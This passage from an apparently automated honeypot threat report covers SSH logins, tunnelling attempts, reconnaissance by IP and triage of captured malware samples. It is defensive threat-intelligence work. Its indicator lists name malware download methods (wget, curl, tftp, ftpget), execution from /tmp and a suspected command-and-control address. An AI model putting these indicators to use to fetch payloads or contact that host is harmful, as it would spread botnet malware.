| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:25:59` | `cowrie.session.connect` |
| `2026-07-09 10:26:00` | `cowrie.client.version` |
| `2026-07-09 10:26:00` | `cowrie.client.kex` |
| `2026-07-09 10:26:03` | `cowrie.login.success` |
| `2026-07-09 10:26:04` | `cowrie.direct-tcpip.request` |
| `2026-07-09 10:26:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.250.19[.]91` to AbuseIPDB if not already reported
- [ ] Block `117.250.19[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6f504558e27

| Field | Detail |
|---|---|
| **Source IP** | `85.105.255[.]56` |
| **First Seen** | 2026-07-09 10:26 |
| **Last Seen** | 2026-07-09 10:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:26:13` | `cowrie.session.connect` |
| `2026-07-09 10:26:14` | `cowrie.client.version` |
| `2026-07-09 10:26:14` | `cowrie.client.kex` |
| `2026-07-09 10:26:15` | `cowrie.login.success` |
| `2026-07-09 10:26:15` | `cowrie.direct-tcpip.request` |
| `2026-07-09 10:26:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.105.255[.]56` to AbuseIPDB if not already reported
- [ ] Block `85.105.255[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f34acebae1d

| Field | Detail |
|---|---|
| **Source IP** | `58.57.154[.]146` |
| **First Seen** | 2026-07-09 10:32 |
| **Last Seen** | 2026-07-09 10:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:32:28` | `cowrie.session.connect` |
| `2026-07-09 10:32:30` | `cowrie.client.version` |
| `2026-07-09 10:32:30` | `cowrie.client.kex` |
| `2026-07-09 10:32:32` | `cowrie.login.success` |
| `2026-07-09 10:32:33` | `cowrie.direct-tcpip.request` |
| `2026-07-09 10:32:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.57.154[.]146` to AbuseIPDB if not already reported
- [ ] Block `58.57.154[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be1390fc817c

| Field | Detail |
|---|---|
| **Source IP** | `200.232.114[.]71` |
| **First Seen** | 2026-07-09 10:32 |
| **Last Seen** | 2026-07-09 10:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:32:39` | `cowrie.session.connect` |
| `2026-07-09 10:32:40` | `cowrie.client.version` |
| `2026-07-09 10:32:40` | `cowrie.client.kex` |
| `2026-07-09 10:32:43` | `cowrie.login.success` |
| `2026-07-09 10:32:43` | `cowrie.direct-tcpip.request` |
| `2026-07-09 10:32:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.232.114[.]71` to AbuseIPDB if not already reported
- [ ] Block `200.232.114[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ecf945c5d87

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 10:34 |
| **Last Seen** | 2026-07-09 10:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:34:40` | `cowrie.session.connect` |
| `2026-07-09 10:34:40` | `cowrie.client.version` |
| `2026-07-09 10:34:40` | `cowrie.client.kex` |
| `2026-07-09 10:34:41` | `cowrie.login.success` |
| `2026-07-09 10:34:42` | `cowrie.session.params` |
| `2026-07-09 10:34:42` | `cowrie.command.input` |
| `2026-07-09 10:34:42` | `cowrie.log.closed` |
| `2026-07-09 10:34:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c6a617c12ae

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 10:38 |
| **Last Seen** | 2026-07-09 10:38 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:38:08` | `cowrie.session.connect` |
| `2026-07-09 10:38:11` | `cowrie.client.version` |
| `2026-07-09 10:38:11` | `cowrie.client.kex` |
| `2026-07-09 10:38:16` | `cowrie.login.success` |
| `2026-07-09 10:38:20` | `cowrie.session.params` |
| `2026-07-09 10:38:20` | `cowrie.command.input` |
| `2026-07-09 10:38:22` | `cowrie.log.closed` |
| `2026-07-09 10:38:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f0d8b7f8580

| Field | Detail |
|---|---|
| **Source IP** | `45.179.200[.]156` |
| **First Seen** | 2026-07-09 10:44 |
| **Last Seen** | 2026-07-09 10:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:44:40` | `cowrie.session.connect` |
| `2026-07-09 10:44:40` | `cowrie.client.version` |
| `2026-07-09 10:44:40` | `cowrie.client.kex` |
| `2026-07-09 10:44:42` | `cowrie.login.success` |
| `2026-07-09 10:44:42` | `cowrie.direct-tcpip.request` |
| `2026-07-09 10:44:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.179.200[.]156` to AbuseIPDB if not already reported
- [ ] Block `45.179.200[.]156` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82a69bed8a97

| Field | Detail |
|---|---|
| **Source IP** | `191.241.142[.]170` |
| **First Seen** | 2026-07-09 10:44 |
| **Last Seen** | 2026-07-09 10:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:44:47` | `cowrie.session.connect` |
| `2026-07-09 10:44:48` | `cowrie.client.version` |
| `2026-07-09 10:44:48` | `cowrie.client.kex` |
| `2026-07-09 10:44:51` | `cowrie.login.success` |
| `2026-07-09 10:44:52` | `cowrie.direct-tcpip.request` |
| `2026-07-09 10:44:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.241.142[.]170` to AbuseIPDB if not already reported
- [ ] Block `191.241.142[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-864fb2cc6437

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]183` |
| **First Seen** | 2026-07-09 10:48 |
| **Last Seen** | 2026-07-09 10:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:48:14` | `cowrie.session.connect` |
| `2026-07-09 10:48:14` | `cowrie.client.version` |
| `2026-07-09 10:48:14` | `cowrie.client.kex` |
| `2026-07-09 10:48:15` | `cowrie.login.success` |
| `2026-07-09 10:48:16` | `cowrie.direct-tcpip.request` |
| `2026-07-09 10:48:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]183` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]183` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c6db657813b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 10:48 |
| **Last Seen** | 2026-07-09 10:48 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:48:19` | `cowrie.session.connect` |
| `2026-07-09 10:48:21` | `cowrie.client.version` |
| `2026-07-09 10:48:21` | `cowrie.client.kex` |
| `2026-07-09 10:48:27` | `cowrie.login.success` |
| `2026-07-09 10:48:30` | `cowrie.session.params` |
| `2026-07-09 10:48:30` | `cowrie.command.input` |
| `2026-07-09 10:48:31` | `cowrie.log.closed` |
| `2026-07-09 10:48:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af13bb310715

| Field | Detail |
|---|---|
| **Source IP** | `207.219.221[.]101` |
| **First Seen** | 2026-07-09 10:51 |
| **Last Seen** | 2026-07-09 10:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:51:34` | `cowrie.session.connect` |
| `2026-07-09 10:51:34` | `cowrie.client.version` |
| `2026-07-09 10:51:34` | `cowrie.client.kex` |
| `2026-07-09 10:51:35` | `cowrie.login.success` |
| `2026-07-09 10:51:36` | `cowrie.direct-tcpip.request` |
| `2026-07-09 10:51:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.219.221[.]101` to AbuseIPDB if not already reported
- [ ] Block `207.219.221[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `179.61.192[.]156` | **87** | 2026-07-09 06:55 | 2026-07-09 10:54 | 86m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-07-09 07:17 | 2026-07-09 10:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `206.81.2[.]201` | **5** | 2026-07-09 07:38 | 2026-07-09 09:44 | 2m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **3** | 2026-07-09 07:51 | 2026-07-09 09:51 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `165.232.174[.]146` | **3** | 2026-07-09 10:19 | 2026-07-09 10:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]222` | **3** | 2026-07-09 09:34 | 2026-07-09 09:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | **3** | 2026-07-09 07:01 | 2026-07-09 08:13 | 2m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | **2** | 2026-07-09 07:53 | 2026-07-09 08:53 | 1m | 0 | `T1592` | 🟢 LOW |
| `152.32.170[.]42` | **2** | 2026-07-09 10:54 | 2026-07-09 10:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | **2** | 2026-07-09 07:19 | 2026-07-09 07:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `212.8.242[.]38` | **2** | 2026-07-09 08:33 | 2026-07-09 08:52 | 1m | 0 | `T1592` | 🟢 LOW |
| `106.89.59[.]26` | 1 | 2026-07-09 08:46 | 2026-07-09 08:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.21.105[.]250` | 1 | 2026-07-09 09:27 | 2026-07-09 09:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.34.85[.]168` | 1 | 2026-07-09 08:16 | 2026-07-09 08:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.183.180[.]108` | 1 | 2026-07-09 10:04 | 2026-07-09 10:04 | 5s | 0 | `T1592` | 🟢 LOW |
| `120.239.57[.]124` | 1 | 2026-07-09 09:08 | 2026-07-09 09:08 | 12s | 0 | `T1592` | 🟢 LOW |
| `121.229.9[.]110` | 1 | 2026-07-09 08:08 | 2026-07-09 08:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `164.92.115[.]22` | 1 | 2026-07-09 08:11 | 2026-07-09 08:12 | 41s | 0 | `T1592` | 🟢 LOW |
| `174.64.199[.]85` | 1 | 2026-07-09 08:03 | 2026-07-09 08:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `175.103.54[.]172` | 1 | 2026-07-09 09:04 | 2026-07-09 09:04 | 13s | 0 | `T1592` | 🟢 LOW |
| `176.10.203[.]54` | 1 | 2026-07-09 08:14 | 2026-07-09 08:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `184.178.172[.]20` | 1 | 2026-07-09 08:48 | 2026-07-09 08:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `2.74.192[.]203` | 1 | 2026-07-09 07:29 | 2026-07-09 07:29 | 2s | 0 | `T1592` | 🟢 LOW |
| `218.200.9[.]182` | 1 | 2026-07-09 08:23 | 2026-07-09 08:24 | 16s | 0 | `T1592` | 🟢 LOW |
| `218.21.246[.]238` | 1 | 2026-07-09 10:28 | 2026-07-09 10:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]120` | 1 | 2026-07-09 09:58 | 2026-07-09 09:59 | 6s | 0 | `T1592` | 🟢 LOW |
| `45.225.135[.]20` | 1 | 2026-07-09 07:17 | 2026-07-09 07:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]122` | 1 | 2026-07-09 07:35 | 2026-07-09 07:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | 1 | 2026-07-09 08:34 | 2026-07-09 08:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.213.194[.]139` | 1 | 2026-07-09 10:37 | 2026-07-09 10:38 | 30s | 0 | `T1592` | 🟢 LOW |
| `59.34.17[.]130` | 1 | 2026-07-09 07:28 | 2026-07-09 07:29 | 31s | 0 | `T1592` | 🟢 LOW |
| `59.92.51[.]186` | 1 | 2026-07-09 07:18 | 2026-07-09 07:18 | 15s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]192` | 1 | 2026-07-09 10:49 | 2026-07-09 10:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]187` | 1 | 2026-07-09 10:48 | 2026-07-09 10:48 | 15s | 0 | `T1592` | 🟢 LOW |
| `72.14.178[.]148` | 1 | 2026-07-09 09:33 | 2026-07-09 09:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.177.157[.]179` | 1 | 2026-07-09 08:36 | 2026-07-09 08:36 | 8s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 57/100 | 🟡 MEDIUM | **18/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/73** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **32/73** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/73** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/73** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/73** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 52/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 61/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 86/100 | 🔴 HIGH | **39/73** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `85338e737e8b8c9ff9742ebc5bb0b73d91d441774161ad936f14910259d985ba` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `85338e737e8b8c9f...` | 60/100 | 🟡 MEDIUM | **26/73** 🔴 |
| `85a17fe8e290a224a717445d0f5e819283567101a92945ea10069946dc7e19d8` | Shell Script | `85a17fe8e290a224...` | 56/100 | 🟡 MEDIUM | **16/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `8ee57538c54d91114aaf824330878c6bca5e905f32a7d4ee7517e1efd364e19c` | Unknown binary | `8ee57538c54d9111...` | 56/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `65.20.131[.]63` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `144.22.238[.]238` | BR | Oracle Corporation | **100** ⚠️ | 3 |
| `121.22.99[.]2` | CN | China Unicom Hebei province network | **100** ⚠️ | 50 |
